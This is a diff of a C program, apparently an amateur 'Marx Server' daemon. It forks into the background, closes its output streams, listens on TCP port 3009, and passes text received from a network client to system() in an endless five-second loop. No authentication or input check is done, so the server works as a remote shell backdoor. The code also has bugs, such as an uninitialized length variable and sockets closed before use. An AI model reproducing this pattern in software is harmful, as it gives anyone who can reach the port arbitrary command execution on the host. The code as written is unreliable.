@@ -19,15 +19,17 @@
 #include <netinet/in.h>
 #include <linux/futex.h>
 #include <sys/time.h>
+#include <sys/epoll.h>
 
 
 #include "tree.h" // this is for the binary ~ non cascade!! 
 #include "etc_functions.h" // this is for the binary ~ non cascade!! 
 #include "constant_definitions.h" //this is used for self modifying code and other things
+#include "socketConnections.h"
 /*Define Constant Macros */
 
 #define appName "Marx Server" //application name
-#define appVers ".07" //alpha version 
+#define appVers ".10" //alpha version 
 #define maxConnections 1024 // this will be used for the maximum connections to this server
 #define maxThreads 64 //might increase depending on the processor
 #define portNum 3009 //this is the default port number for the process
@@ -48,23 +50,7 @@ typedef unsigned int uint; //use this for an unsigned interger
 int main(int argc, char **argv)
 {
 
-			if ( argc != 2 ) /* argc should be 2 for correct execution */
-			{
-				/* We print argv[0] assuming it is the program name */
-				
-				fprintf(stderr, "Usage: %s <string>\n", argv[0]);
-            
-
-				printf( "\n\n\n"); 
-				printf( "This program takes to commands issued\n"); 
-				printf( "%s : param0\n",argv[0]); 
-					exit(EXIT_FAILURE); //this will exit the application
-
-
-			}
-				
-			else
-			{
+		
 
 				
 					
@@ -76,8 +62,9 @@ int main(int argc, char **argv)
 					int n;
 					char buf; //misc buffer
 					uint loopPthreadCounter = 0;
-
-
+					int errorTrap; 
+				
+				
 					pid = fork(); //fork the proceess to a child process
 					
 					if(pid < 0)
@@ -94,8 +81,7 @@ int main(int argc, char **argv)
 						exit(EXIT_SUCCESS); // exit, things have failed
 					}
 					
-					
-						umask(0); //change the file mask
+					umask(0); //change the file mask
 					
 					sid = setsid(); //get a set id for child process
 						
@@ -119,61 +105,50 @@ int main(int argc, char **argv)
 					close(STDERR_FILENO);
 					
 					
-					/* socket stuff goes here */
 					
-							sockfd = socket(AF_INET, SOCK_STREAM, 0); //this sets up the socket structure for TCP connections
+								/* Main loop begins below */ 
+								sockfd = createAndBindSocket(portNum);
 								if (sockfd < 0)
 								{
-								quitWithError("ERROR opening socket");
+									quitWithError("Error creating and binding socket!");
 								}
-								bzero((char *) &serv_addr, sizeof(serv_addr)); //initiates a server buffer to zero
-								//~ portno = atoi(argv[1]); //just here for reference.. the atio() function converts a string to an integer
-								portno = portNum; //this is the port number
-								serv_addr.sin_family = AF_INET; //sets the server address as a TCP socket
-								serv_addr.sin_port = htons(portno); //sets the port number of the 
-								if (bind(sockfd, (struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0) //binds a socket to an address
-								{
-									quitWithError("ERROR on binding");
-								}
-								/* Main loop begins below */ 
 								
-								listen(sockfd,5); //allows this process to listen on this socket
-								clilen = sizeof(cli_addr);
-								newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
 								
-							if (newsockfd < 0)
-							{
-							quitWithError("ERROR on accept");
-							}
+								errorTrap = listen(sockfd,5); //allows this process to listen on this socket
+								
+								  if (errorTrap < 0)
+									{
+									  quitWithError("Error listening to binded socket!");
+									  
+									}
+								
+							newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
 							bzero(buffer,256);
-							n = read(newsockfd,buffer,255);
-							if (n < 0)
-							{
-							 quitWithError("ERROR reading from socket");
-							}
+								
+							//~ recv(newsockfd,buffer,256,0);
 							
-							system("clear");
+							 n = recv(newsockfd,buffer,255,0);
+							 if (n < 0) error("ERROR reading from socket");
+							 
+							 n = send(newsockfd,"I got your message",18,0);
+							 if (n < 0) error("ERROR writing to socket");
+							 close(newsockfd);
+							 close(sockfd);
 							
-							
-							n = write(newsockfd,"I got your message",18);
-							if (n < 0)
-							{
-							 error("ERROR writing to socket");
-							}							
 							while(1)
 							{
 								
 								
-								/*This below is really for debugging */
-								//~ printf("This application is the %s, version : %s\n",appName,appVers);
-							   //~ printf("%s Is the best application ever!\n",appName); //this is used to debug the messages
-							   //~ puts(" Is the best application ever!\n"); //hahaha
-								printf("Here is the message: %s",buffer);
-								system(buffer);
-							
-							
-								sleep(5); // make sure to sleep.. 5 takes a bunch of cpu hahaha	
 								
+								//~ printf("Here is the message: %s\n",buffer);
+								//~ printf("%s\n",buffer);
+								//~ 
+								
+								
+								system(buffer); // this is so dangerous right here be very careful/// 
+								sleep(5); //dont waste the cpu with this loop/./ yeah
+										
+										
 								if (loopPthreadCounter < maxThreads) //this is just a counter from withing the
 								{
 									loopPthreadCounter++;
@@ -182,19 +157,33 @@ int main(int argc, char **argv)
 								{
 									loopPthreadCounter = 0;
 								}
-								
+							
 							}
+										
+										
+										
+								/*This below is really for debugging */
+								//~ printf("This application is the %s, version : %s\n",appName,appVers);
+							   //~ printf("%s Is the best application ever!\n",appName); //this is used to debug the messages
+							   //~ puts(" Is the best application ever!\n"); //hahaha
+								
+								
+							
+								
+							
 							//~this is where execution begins
 					
+					
+						return 0;
+
 						}
 	
 	
 
 	
-	return 0;
 	
 	
  
 	//this is the end of the line right here,,, make sure to return 0 if everything went right
-}
+
 
